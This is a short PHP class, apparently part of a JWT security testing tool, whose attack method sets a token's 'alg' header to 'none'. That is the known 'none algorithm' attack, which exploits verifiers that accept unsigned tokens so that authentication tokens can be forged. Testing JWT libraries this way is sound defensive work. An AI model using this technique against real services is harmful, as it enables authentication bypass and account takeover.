<?php

namespace App\Attack;

use App\JWT;

class None
{
    public static function attack(JWT $jwt): JWT
    {
        $jwt->headers['alg'] = 'none';

        return $jwt;
    }
}